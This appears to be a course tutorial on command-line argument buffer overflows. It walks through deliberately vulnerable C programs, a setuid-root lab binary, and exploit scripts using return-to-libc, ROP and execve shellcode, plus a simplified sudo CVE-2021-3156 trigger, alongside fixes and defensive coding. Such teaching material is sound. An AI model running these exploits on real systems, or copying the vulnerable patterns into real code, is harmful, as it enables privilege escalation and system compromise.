# Command Line Argument Buffer Overflow

## Overview

This example focuses on buffer overflows triggered through command-line arguments. Unlike standard input vulnerabilities, command-line argument overflows are particularly dangerous because they can be exploited through shell scripts, batch files, or automated systems that call vulnerable programs.

## Why Command-Line Arguments?

### Real-World Relevance

**Common Scenarios:**
- System utilities executed by scripts
- Programs called by other programs
- Setuid/setgid binaries (privilege escalation)
- Automated processing pipelines
- CGI scripts and web applications calling binaries

**Attack Vectors:**
- Shell scripts with insufficient input validation
- Environment variables passed to programs
- Automated job processors
- Inter-process communication
- File handlers and protocol handlers

## Example: Vulnerable Command-Line Program

### The Vulnerable Code

```c
#include <stdio.h>
#include <string.h>

void process_input(char *input) {
    char buffer[64];  // Fixed-size buffer
    
    // VULNERABLE: No bounds checking!
    strcpy(buffer, input);
    
    printf("Processing: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    process_input(argv[1]);
    
    printf("Done!\n");
    return 0;
}
```

### Create the Example

Save the code above as `cli_vuln.c` and compile:

```bash
gcc cli_vuln.c -o cli_vuln -fno-stack-protector -z execstack -m32 -g
```

## Exploitation Workflow

### Step 1: Normal Operation

```bash
./cli_vuln "Hello, World!"
# Output: Processing: Hello, World!
#         Done!
```

### Step 2: Trigger a Crash

```bash
./cli_vuln "$(python3 -c 'print("A" * 100)')"
# Output: Processing: AAAAAAA...
#         Segmentation fault (core dumped)
```

### Step 3: Find the Offset

```bash
# Generate a unique pattern
pattern=$(python3 -c "
import string
pattern = ''
for i in range(100):
    pattern += chr(65 + (i % 26))
print(pattern)
")

# Run with pattern
./cli_vuln "$pattern"

# Debug to find offset
gdb ./cli_vuln
(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"
(gdb) info registers eip
```

### Step 4: Control Execution

```bash
# Find address of a target function or shellcode
objdump -d cli_vuln | grep process_input

# Craft exploit payload (example)
./cli_vuln "$(python3 -c 'print("A"*76 + "\xef\xbe\xad\xde")')"
```

## Advanced Example: Privilege Escalation Scenario

### Setuid Binary Exploitation

Create a more realistic vulnerable setuid program:

```c
// privesc_vuln.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void admin_function() {
    printf("*** ADMIN MODE ACTIVATED ***\n");
    setuid(0);  // Attempt to become root
    setgid(0);
    system("/bin/sh");  // Spawn shell with elevated privileges
}

void process_command(char *cmd) {
    char buffer[100];
    strcpy(buffer, cmd);  // VULNERABLE!
    printf("Executing: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return 1;
    }
    
    printf("System Utility v1.0\n");
    process_command(argv[1]);
    
    return 0;
}
```

### Compilation (Privilege Escalation Setup)

```bash
# Compile
gcc privesc_vuln.c -o privesc_vuln -fno-stack-protector -z execstack -m32

# Make it setuid root (ONLY IN TEST ENVIRONMENTS!)
sudo chown root:root privesc_vuln
sudo chmod u+s privesc_vuln

# Verify setuid bit
ls -l privesc_vuln
# Should show: -rwsr-xr-x ... root root ... privesc_vuln
```

### Exploitation Strategy

**Goal**: Overflow buffer to redirect execution to `admin_function()`

```bash
# Find admin_function address
objdump -d privesc_vuln | grep admin_function
# Example: 08048456 <admin_function>

# Calculate offset (typically 112-116 bytes for 100-byte buffer + saved EBP)
# Craft payload
python3 << 'EOF'
import struct

admin_addr = 0x08048456  # Replace with actual address
offset = 112  # Adjust based on your findings

payload = b"A" * offset + struct.pack("<I", admin_addr)
print(payload.decode('latin-1'))
EOF

# Execute exploit
./privesc_vuln "$(python3 exploit.py)"
```

## Common Command-Line Vulnerability Patterns

### Pattern 1: Direct Argument Copy

```c
// VULNERABLE
int main(int argc, char *argv[]) {
    char buffer[50];
    strcpy(buffer, argv[1]);  // No size check
}
```

**Fix:**
```c
// SAFE
int main(int argc, char *argv[]) {
    char buffer[50];
    if (strlen(argv[1]) >= sizeof(buffer)) {
        fprintf(stderr, "Argument too long\n");
        return 1;
    }
    strcpy(buffer, argv[1]);
}
```

### Pattern 2: Multiple Argument Concatenation

```c
// VULNERABLE
int main(int argc, char *argv[]) {
    char buffer[100];
    buffer[0] = '\0';
    for (int i = 1; i < argc; i++) {
        strcat(buffer, argv[i]);  // No bounds checking!
        strcat(buffer, " ");
    }
}
```

**Fix:**
```c
// SAFE
int main(int argc, char *argv[]) {
    char buffer[100];
    size_t remaining = sizeof(buffer) - 1;
    char *ptr = buffer;
    
    for (int i = 1; i < argc && remaining > 0; i++) {
        size_t len = strlen(argv[i]);
        if (len > remaining) len = remaining;
        
        memcpy(ptr, argv[i], len);
        ptr += len;
        remaining -= len;
        
        if (remaining > 0) {
            *ptr++ = ' ';
            remaining--;
        }
    }
    *ptr = '\0';
}
```

### Pattern 3: Format String + Argument

```c
// VULNERABLE
int main(int argc, char *argv[]) {
    char buffer[100];
    sprintf(buffer, "User input: %s", argv[1]);  // No size check
}
```

**Fix:**
```c
// SAFE
int main(int argc, char *argv[]) {
    char buffer[100];
    snprintf(buffer, sizeof(buffer), "User input: %s", argv[1]);
}
```

## Exploitation Techniques

### Technique 1: Return-to-libc

When DEP/NX is enabled (stack not executable):

```python
#!/usr/bin/env python3
import struct

# Addresses (find using objdump, gdb, or checksec)
system_addr = 0xb7e42da0  # Address of system() in libc
exit_addr = 0xb7e369d0    # Address of exit() in libc
sh_string = 0xb7f6a06b     # Address of "/bin/sh" string in libc

offset = 76  # Offset to return address

# Payload structure: [padding][system][exit][/bin/sh]
payload = b"A" * offset
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", exit_addr)
payload += struct.pack("<I", sh_string)

print(payload.decode('latin-1'))
```

### Technique 2: ROP Chain

For more complex exploitation with ASLR:

```python
#!/usr/bin/env python3
import struct

# ROP gadgets (find using ropper or ROPgadget)
pop_eax = 0x080483d1  # pop eax; ret
pop_ebx = 0x080481c9  # pop ebx; ret
int_80 = 0x08048420   # int 0x80

offset = 76

# Build ROP chain for execve("/bin/sh", NULL, NULL)
rop = b"A" * offset
rop += struct.pack("<I", pop_eax)
rop += struct.pack("<I", 0x0b)  # execve syscall number
rop += struct.pack("<I", pop_ebx)
rop += struct.pack("<I", sh_string_addr)
# ... (simplified example)

print(rop.decode('latin-1'))
```

### Technique 3: Shellcode Injection

When stack is executable:

```python
#!/usr/bin/env python3
import struct

# 32-bit Linux execve shellcode (25 bytes)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# NOP sled
nop_sled = b"\x90" * 50

# Estimate stack address (or find with GDB)
buffer_addr = 0xbffff600  # Example address

offset = 76

# Payload: [NOP sled][shellcode][padding][return address]
payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))
payload += struct.pack("<I", buffer_addr + 10)  # Jump into NOP sled

print(payload.decode('latin-1'))
```

## Defensive Programming

### Validate All Inputs

```c
int main(int argc, char *argv[]) {
    // Check argument count
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    // Validate argument length
    size_t arg_len = strlen(argv[1]);
    if (arg_len > MAX_INPUT_SIZE) {
        fprintf(stderr, "Error: Input too long (max %d bytes)\n", 
                MAX_INPUT_SIZE);
        return 1;
    }
    
    // Validate argument content (example: alphanumeric only)
    for (size_t i = 0; i < arg_len; i++) {
        if (!isalnum(argv[1][i]) && argv[1][i] != '_') {
            fprintf(stderr, "Error: Invalid characters in input\n");
            return 1;
        }
    }
    
    // Now safe to process
    process_input(argv[1]);
    return 0;
}
```

### Use Safe Functions

```c
// Instead of strcpy
strncpy(buffer, argv[1], sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';

// Instead of sprintf
snprintf(buffer, sizeof(buffer), "Input: %s", argv[1]);

// Instead of strcat
strncat(buffer, argv[1], sizeof(buffer) - strlen(buffer) - 1);
```

## Real-World Case Studies

### Sudo (CVE-2021-3156) - Baron Samedit

**Vulnerability**: Heap-based buffer overflow in sudo's argument parsing
**Impact**: Local privilege escalation on Linux/Unix systems
**Affected**: sudo versions 1.8.2 through 1.9.5p1
**Exploit**: Specially crafted command-line arguments

```bash
# Exploit example (simplified)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

### exim4 (CVE-2010-4344)

**Vulnerability**: Buffer overflow in command-line argument handling
**Impact**: Remote code execution as root
**Affected**: Exim versions < 4.69
**Exploit**: Long argument to mail delivery

## Practice Challenges

### Challenge 1: Basic Overflow (Easy)
Create a program that takes a command-line argument and crashes it with a buffer overflow.

### Challenge 2: Offset Finding (Medium)
Given the `cli_vuln` program, determine the exact offset to the return address using pattern generation.

### Challenge 3: Function Redirection (Medium-Hard)
Craft an input that redirects execution to a specific function in the binary.

### Challenge 4: Privilege Escalation (Hard)
Exploit the `privesc_vuln` setuid binary to gain a root shell (in a VM!).

### Challenge 5: Bypassing Filters (Advanced)
Modify your exploit to work when certain characters are filtered (e.g., no spaces, no null bytes).

## Testing & Debugging

### GDB Workflow

```bash
# Start GDB with arguments
gdb --args ./cli_vuln "AAAA"

# Or run with arguments in GDB
gdb ./cli_vuln
(gdb) run "AAAAAAAAAAAA"

# Set breakpoint before vulnerable function
(gdb) break process_input
(gdb) run "$(python3 -c 'print("A"*100)')"

# Examine stack
(gdb) x/50wx $esp

# Check registers after crash
(gdb) info registers

# Backtrace
(gdb) backtrace
```

### Finding Offsets with Core Dumps

```bash
# Enable core dumps
ulimit -c unlimited

# Run program to crash
./cli_vuln "$(python3 -c 'print("A"*100)')"

# Analyze core dump
gdb ./cli_vuln core
(gdb) info registers eip
(gdb) x/20wx $esp
```

## Key Takeaways

1. **Command-line arguments are user input** - Treat them as untrusted
2. **Validate before use** - Check length, content, and format
3. **Setuid binaries are critical targets** - Extra care needed
4. **Environment matters** - Shell escaping, quotes, and encoding affect exploitation
5. **Defense in depth** - Combine input validation, safe functions, and system protections

## Next Steps

- Practice with the [Advanced Stack Overflow](../04-advanced-stack/) challenge
- Learn [Shellcode Basics](../../exploitation/shellcode-basics.md)
- Study [Modern Mitigations](../../defenses/mitigations.md)
- Explore [ROP techniques](../../exploitation/writing-exploits.md)

## References

- [Argument Injection Vulnerabilities](https://cwe.mitre.org/data/definitions/88.html)
- [Baron Samedit: sudo vulnerability analysis](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
- [Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

---

**⚠️ Security Warning**: These techniques are for educational purposes in controlled environments only. Exploiting vulnerabilities in systems you don't own or have permission to test is illegal and unethical.

